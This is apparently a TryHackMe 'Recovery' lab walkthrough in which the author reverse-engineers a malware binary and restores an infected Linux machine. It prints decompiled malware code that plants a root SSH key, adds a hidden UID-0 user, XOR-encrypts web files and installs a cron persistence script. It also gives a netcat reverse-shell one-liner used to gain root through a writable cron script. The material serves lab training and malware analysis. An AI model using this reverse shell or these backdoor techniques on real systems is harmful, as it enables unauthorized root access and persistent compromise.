# Recovery: TryHackMe Walkthrough

We are going this time for a machine with medium difficulty, it consists of challenges regarding malware analysis.

Let's get into the machine and check out the problem with the set of credentials provided! But it won't be of any help as it will spam us with `DIDN'T SAY THE MAGIC WORD`. 

So using `scp` we could download the `fixutil` into our system without entering the remote system.
```shell 
$ scp alex@IP:~/fixutil .
```

As we have fixutil, we shall throw that into `Ghidra` and decompile and see the issues!

At first we have to get into the system, so we can see what does that infinite loop with the message - `DIDN'T SAY THE MAGIC WORD`. We can see in the decompiled version of `main` function, that the malware changes .bashrc file and appends it in the infinite while loop.

```c
undefined8 main(void)

{
  FILE *__s;
  
  __s = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,__s);
  fclose(__s);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  __s = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,__s);
  fclose(__s);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}

```
So, we can `scp` the .bashrc file remove `while :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done` line from it and scp back to alex's system. Now we can easily access the system using `ssh`.
```
scp .bashrc alex@IP:.bashrc
```

<br>
We got into system, but it seems within few seconds it forces logout. If we `strings` the fixutil, we see that there is a script - `brilliant_script.sh` and it is running on a cron job and it is run by ROOT and this is writable by all...this is interesting.
<br><br>
Let's have a look what this script does - it kills all the active bash sessions, which is why everytime it logs out by itself. 

```bash
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```
Let's change it's content and scp it back to alex's system and we should be able to get a foothold. And yes, we are inside Alex's system and we have another flag.
```shell 
$ scp brilliant_script.sh alex@IP:/opt/brilliant_script.sh
```

Since we know that the `brilliant_script.sh` is run by ROOT and is being executed by a cronjob, what we can do is put a reverse shell script in the file and `scp` back to alex's machine and start a netcat listener in our machine and if everything is great, we will be able to get root shell.
```shell
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myIP 1234 >/tmp/f
```
And voila, we get root access!!!! <br><br>
There are few things that the malware have done, that we have realized during decompiling the `liblogging.so`. We reached till this point when we de compiled `admin` binary, there we saw that if the password is incorrect it redirects to a function called `LogIncorrectAttempt`, that we found in `liblogging.so`.

```c
void LogIncorrectAttempt(char *attempt)

{
  time_t tVar1;
  FILE *__stream;
  char *ssh_key;
  FILE *authorized_keys;
  FILE *script_f;
  FILE *cron_f;
  
  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  __stream = fopen("/root/.ssh/authorized_keys","w");
  fprintf(__stream,"%s\n",
                    
          "ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"
         );
  fclose(__stream);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo\'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );
  XOREncryptWebFiles();
  __stream = fopen("/opt/brilliant_script.sh","w");
  fwrite(
         "#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill$i; done;\n"
         ,1,0x5f,__stream);
  fclose(__stream);
  __stream = fopen("/etc/cron.d/evil","w");
  fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,__stream);
  fclose(__stream);
  chmod("/opt/brilliant_script.sh",0x1ff);
  chmod("/etc/cron.d/evil",0x1ed);
  return;
}

```
<br>
After getting the root access, first thing we do delete the `.ssh` folder, which gives us flag 3.
<br><br>
Then we can see that the malware creates a new user `security` in the `/etc/passwd`, what we can do is remove that from the file, the method I have used is to use `sed` to remove the last line from `/etc/passwd`.

```shell
# sed -i '$ d' /etc/passwd > /etc/passwd
```
A better and proficient way to do this can be,
```shell
# /usr/sbin/userdel -rf security 
```
And we have our 4th flag! 

To recover from `/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so` we need to revert this, by renaming the files and we get the flag 2!

The final job is to decrypt the server files and doing a bit more recon, we found a function - `XOREncryptWebFiles` and looking through it's source code,
```c
void XOREncryptWebFiles(void)

{
  int iVar1;
  char *str;
  FILE *__stream;
  char **webfiles;
  long lVar2;
  stat *psVar3;
  long in_FS_OFFSET;
  byte bVar4;
  int iStack200;
  stat sStack168;
  long lStack16;
  
  bVar4 = 0;
  lStack16 = *(long *)(in_FS_OFFSET + 0x28);
  str = (char *)malloc(0x11);
  if (str == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  rand_string(str,0x10);
  lVar2 = 0x12;
  psVar3 = &sStack168;
  while (lVar2 != 0) {
    lVar2 = lVar2 + -1;
    psVar3->st_dev = 0;
    psVar3 = (stat *)(&psVar3->st_dev + (ulong)bVar4 * 0x1ffffffffffffffe + 1);
  }
  iVar1 = stat(encryption_key_dir,&sStack168);
  if (iVar1 == -1) {
    mkdir(encryption_key_dir,0x1c0);
  }
  __stream = fopen("/opt/.fixutil/backup.txt","a");
  fprintf(__stream,"%s\n",str);
  fclose(__stream);
  webfiles = (char **)malloc(8);
  if (webfiles != (char **)0x0) {
    iVar1 = GetWebFiles(webfiles,8);
    iStack200 = 0;
    while (iStack200 < iVar1) {
      XORFile(webfiles[iStack200],str);
      free(webfiles[iStack200]);
      iStack200 = iStack200 + 1;
    }
    free(webfiles);
    if (lStack16 == *(long *)(in_FS_OFFSET + 0x28)) {
      return;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}

```

we found that there is a new directory created and the symmetric key is stored in `encryption_key_dir` and the `/opt/.fixutil/backup.txt` is being changed, so we could check out the log file at first.
<br><br>
And we have found something, that look to me like a key and this can be used to decrypt the web server.
<br>
By looking at the hints and file names it seems to me, that it's like XOR encryption, so we can use [xor-decrypt.py](https://github.com/AlexFSmirnov/xor-decrypt/blob/master/xor-decrypt.py) to decrypt the files.

Let's scp the file to our system for decryption and then send back them to the remote server and we are done! 

```shell
$ python3 xor-decrypt.py -i encrypted/index.html -o decrypted/index.html -k key -d
$ python3 xor-decrypt.py -i encrypted/todo.html -o decrypted/todo.html -k key -d
$ python3 xor-decrypt.py -i encrypted/reallyimportant.txt -o decrypted/reallyimportant.txt -k key -d
```

We can't send back using `scp` because we are using alex's account (non-root). So, we can use root shell, to wget the files from our system.

And here we have the 5th flag!! Machine recovered!!